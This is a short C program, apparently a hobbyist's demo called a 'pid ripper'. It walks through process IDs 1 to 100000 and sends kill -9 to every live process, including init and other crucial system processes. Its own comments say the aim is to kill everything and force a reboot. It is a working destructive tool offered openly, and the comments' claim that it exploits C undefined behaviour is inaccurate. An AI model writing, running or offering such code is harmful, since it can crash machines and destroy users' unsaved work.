//This is a pid ripper as the name suggests here i implmenter what i call myself as a pid ripper it seearhces ever pid through a loop and 
//kill it with a small mechanism hence hitting crucial processes in the way and completey killing all process and effectively doing a system reboot
//no malicious intent tho just showing the power of syscalls and exploiting the UB of c programming language

#include <stdio.h>
#include <unistd.h>
#include <sys/wait.h>
#include <signal.h>
int main() {
    for (int i = 1; i <= 100000; i++) {
        
        if (kill(i, 0) == 0) { 
            printf("Found valid PID: %d. Dispatching killer...\n", i);

            pid_t pid = fork();
            if (pid == 0) {
                char pid_str[10];
                sprintf(pid_str, "%d", i);
                char *args[] = {"kill", "-9", pid_str, NULL};
                execv("/bin/kill", args);
            } else {
                wait(NULL); 
            }
        }
    }
    printf("Loop complete. If I'm still alive, I didn't hit my own PID!\n");
    return 0;
}
